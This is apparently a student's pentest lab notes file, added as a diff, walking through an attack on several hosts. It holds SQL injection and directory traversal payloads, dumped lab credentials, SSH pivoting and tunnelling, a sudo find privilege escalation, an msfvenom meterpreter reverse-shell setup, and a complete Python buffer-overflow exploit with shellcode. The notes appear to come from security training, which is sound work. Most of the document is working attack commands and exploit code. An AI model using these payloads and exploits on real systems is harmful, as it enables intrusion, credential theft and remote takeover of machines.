@@ -1,0 +1,258 @@
+---------- 192.168.28.181 ----------
+nmap -Pn -T4 --min-rate 5654654654684 10.50.26.172 -p1-1023 2>/dev/null
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	80/tcp open  http
+	
+#####Large wall of text = look for something hidden in their, like a link######
+
+navigate through site normally.
+
+	If looking for upload attack, look for any upload locations.
+		nikto -h 10.50.26.172 (sudo apt-install)
+			/scripts
+		nmap -Pn -p80
+
+	check for directory traversal
+		../../../../../../../etc/passwd
+		http://10.50.26.172/getcareers.php?myfile=Executive_Assistant.html
+			> Directory Traversal
+			If you can traverse direcotry you can view /etc/hosts
+			
+	Sign in Page (try sql injection)
+		welcome Aaron
+		welcome
+			Open Dev console > Network > request
+			login
+			raw > copy and paste ?<raw data> into url
+			decode from rot13 in cyberchef
+	(
+    [0] => user2
+    [name] => user2
+    [1] => RntyrfVfNER78
+    [pass] => RntyrfVfNER78
+	)	
+	1Array
+	(
+    [0] => user3
+    [name] => user3
+    [1] => Obo4GURRnccyrf
+    [pass] => Obo4GURRnccyrf
+	)
+	1Array
+	(
+    [0] => Lee_Roth
+    [name] => Lee_Roth
+    [1] => anotherpassword4THEages
+    [pass] => anotherpassword4THEages
+	
+	/scripts
+		system_user=user2
+		user_password=EaglesIsARE78
+		
+ssh onto box with user that mathces /etc/passwd
+
+---------- 10.50.26.172 ----------
+hostname
+whoami
+	PublicFacingWebsite
+bash
+cat /etc/hosts
+	192.168.28.181 WebApp
+sudo -l
+	Not allowed
+find / -type f -perm /4000 -ls 2>/dev/null
+find / -type f -perm /2000 -ls 2>/dev/null	
+find / -type f -perm /6000 -ls 2>/dev/null
+	https://gtfobins.github.io/ each binary
+		No results
+which gdb
+	Not available
+crontab -l
+	N/A
+echo $PATH
+	No dot
+
+ssh user2@10.50.26.172 -D 9050									#######Close dynamic tunnels if not ebing used#######
+	proxychains nmap -Pn -T4 --min-rate 5654654654684 192.168.28.181 -p1-1023 2>/dev/null
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		80/tcp open  http
+		
+	proxychains nmap -Pn -T4 --min-rate 5654654654684 192.168.28.181 -p1024-10000 2>/dev/null
+	
+ssh user2@10.50.26.172 -L 10001:192.168.28.181:80
+	
+---------- 192.168.28.181:80 ----------
+try sql injection using GET Method as there is no input field
+	http://localhost:10001/pick.php?product=7 or 1=1
+Determine how many columns there are
+	http://localhost:10001/pick.php?product=7 UNION SELECT 1,2,3; #
+Golden Statement
+	http://localhost:10001/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns ;#
+		look for cutom table
+		siteusers
+		
+Retrieve Information
+	http://localhost:10001/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users ;#
+		
+		$Aaron > ncnffjbeqlCn$$jbeq
+		$user2 > RntyrfVfNER78
+		$user3 > Obo4GURRnccyrf
+		$Lroth > anotherpassword4THEages
+													#########If you cant access a box you cant access it.#########
+
+---------- 10.50.26.172 ----------
+for i in {1..254} ;do (ping -c 1 192.168.28.$i 2>/dev/null | egrep -i "bytes from" &) ;done
+	64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=2.30 ms
+	64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=1.55 ms
+	
+---------- Lin OPs ----------
+proxychains nmap -Pn -T4 --min-rate 5654654654684 192.168.28.172 -p1-1023 2>/dev/null ###### Strange ports could mean ssh or a backddor for instructors. Probably could priv esc ######
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	7008/tcp open  afs3-update
+proxychains nc 192.168.28.172
+	
+ssh Aaron@localhost -L 10003:192.168.28.172:22
+
+---------- 192.168.28.172 ----------
+whoami
+hostname
+	roundserver
+bash
+cat /etc/hosts
+
+which gdb
+	N/A
+sudo -l
+	/usr/bin/find
+	gtfobins find
+sudo find . -exec /bin/sh \; -quit ######Escalated Privileges######
+
+for i in {1..254} ;do (ping -c 1 192.168.28.$i 2>/dev/null | egrep -i "bytes from" &) ;done
+	64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=0.30 ms
+	64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.55 ms
+	
+	
+New Dynamic Tunnel
+proxychains nmap -Pn -T4 --min-rate 5654654654684 192.168.28.179 -p1-1023 2>/dev/null
+proxychains nmap -Pn -T4 --min-rate 5654654654684 192.168.28.179 -p1-1023 2>/dev/null
+	PORT   STATE SERVICE
+	3389/tcp open  ms-wbt-server
+	9999/tcp open  abyss
+	
+nc 192.168.28.179 9999
+	Welcome to secureserver					######## If this is not present, no buffer overflow ########
+	
+tunnel to 3389
+tunnel to 9999
+
+---------- lin_ops ----------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=Linops_IP LPORT=8888 -b '\x00' -f python
+
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 8888
+exploit or run
+
+python2 wind_buff.py
+
+
+---------- 192.168.28.179 ----------
+shell
+hostname
+whoami
+
+-------------If 9999 is not buffer overflow  (NO BUFFER OVERFLOW) -------------
+tunnel to 3389
+rdp to windows box
+	xfreerdp /v:0.0.0.0:1000? /u:Lroth /p:anotherpassword4THEages /size:1280x720 +clipboard
+
+---------- 192.168.28.179 ----------
+services
+	look for blank/broke descriptions
+		secureserver
+			is it running as system, auto or not
+								********If you can rename it, you could replace it.********
+**************** If you are required to replace executable or hijack dll, we will be given the executable or dll.**************** 
+
+
+
+powershell
+	find persistence
+		reg query run and runonce
+	
+	find success and failure logs for auti policy (Need Escalated Privs)
+		auditpol /get /category:* | findstr /i "success failure"
+
+
+
+
+win_buff.py
+#!/usr/bin/python
+  2 
+  3 import socket
+  4 
+  5 buf = "TRUN /.:/" #2002 vs 2003 based on
+  6 
+  7 
+  8 buf += "A" * 2003
+  9 #buf += "BBBB"
+ 10 
+ 11 buf += "\xA0\x12\x50\x62"
+ 12 #62 50 12 A0
+ 13 
+ 14 buf += "\x90" * 10
+ 15 
+ 16 buf += b"\xdb\xdd\xbe\xc5\xe5\x35\xdd\xd9\x74\x24\xf4\x5d"
+ 17 buf += b"\x29\xc9\xb1\x59\x31\x75\x19\x83\xed\xfc\x03\x75"
+ 18 buf += b"\x15\x27\x10\xc9\x35\x28\xdb\x32\xc6\x56\xed\xe0"
+ 19 buf += b"\x4f\x73\x69\x8e\x02\x4b\xf9\xc2\xae\x20\xaf\xf6"
+ 20 buf += b"\x9f\xc9\x5f\x40\x95\x13\xeb\xdc\x02\x6a\x2b\x8c"
+ 21 buf += b"\x6f\xed\xd7\xcf\xa3\xcd\xe6\x1f\xb6\x0c\x2e\xd6"
+ 22 buf += b"\xbc\xe1\xe2\xbe\xb5\xaf\x12\xca\x88\x73\x12\x1c"
+ 23 buf += b"\x87\xcb\x6c\x19\x58\xbf\xc0\x20\x89\xb4\x91\x3a"
+ 24 buf += b"\x79\x41\x79\x1b\x78\x86\xff\x92\x0e\x14\x49\x14"
+ 25 buf += b"\x10\xef\x7d\xdd\xef\x39\x4c\x21\x2e\x0a\xa2\x0d"
+ 26 buf += b"\xb0\x53\x85\xad\xc6\xaf\xf5\x50\xd1\x74\x87\x8e"
+ 27 buf += b"\x54\x6a\x2f\x44\xce\x4e\xd1\x89\x89\x05\xdd\x66"
+ 28 buf += b"\xdd\x41\xc2\x79\x32\xfa\xfe\xf2\xb5\x2c\x77\x40"
+ 29 buf += b"\x92\xe8\xd3\x12\xbb\xa9\xb9\xf5\xc4\xa9\x66\xa9"
+ 30 buf += b"\x60\xa2\x85\xbc\x15\x4b\x56\xc1\x4b\xdb\x9a\x0c"
+ 31 buf += b"\x74\x1b\xb5\x07\x07\x29\x1a\xbc\x8f\x01\xd3\x1a"
+ 32 buf += b"\x57\x10\xf3\x9c\x87\x9a\x94\x62\x28\xda\xbd\xa0"
+ 33 buf += b"\x7c\x8a\xd5\x01\xfd\x41\x26\xad\x28\xff\x2c\x39"
+ 34 buf += b"\xd9\xcd\x2e\xc1\xb5\x33\x4f\x20\x1a\xba\xa9\x12"
+ 35 buf += b"\xf2\xec\x65\xd3\xa2\x4c\xd6\xbb\xa8\x43\x09\xdb"
+ 36 buf += b"\xd2\x8e\x22\x76\x3d\x66\x1a\xef\xa4\x23\xd0\x8e"
+ 37 buf += b"\x29\xfe\x9c\x91\xa2\x0a\x60\x5f\x43\x7f\x72\x88"
+ 38 buf += b"\x34\x7f\x8a\x49\xd1\x7f\xe0\x4d\x73\x28\x9c\x4f"
+ 39 buf += b"\xa2\x1e\x03\xaf\x81\x1d\x44\x4f\x54\x17\x3e\x66"
+ 40 buf += b"\xc2\x17\x28\x87\x02\x97\xa8\xd1\x48\x97\xc0\x85"
+ 41 buf += b"\x28\xc4\xf5\xc9\xe4\x79\xa6\x5f\x07\x2b\x1a\xf7"
+ 42 buf += b"\x6f\xd1\x45\x3f\x30\x2a\xa0\x43\x37\xd4\x36\x6c"
+ 43 buf += b"\x90\xbc\xc8\x2c\x20\x3c\xa3\xac\x70\x54\x38\x82"
+ 44 buf += b"\x7f\x94\xc1\x09\x28\xbc\x48\xdc\x9a\x5d\x4c\xf5"
+ 45 buf += b"\x7b\xc3\x4d\xfa\xa7\xf4\x34\x73\x57\xf5\xc8\x9d"
+ 46 buf += b"\x3c\xf6\xc8\xa1\x42\xcb\x1e\x98\x30\x0a\xa3\x9f"
+ 47 buf += b"\x4b\x39\x86\xb6\xc1\x41\x94\xc9\xc3"
+ 48 
+ 49 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+ 50 
+ 51 s.connect(("192.168.150.245", 9999))
+ 52 
+ 53 print (s.recv(1024))
+ 54 
+ 55 s.send(buf)
+ 56 
+ 57 print s.recv(1024)
+ 58 
+ 59 s.close()
+ 
+
+
+
+
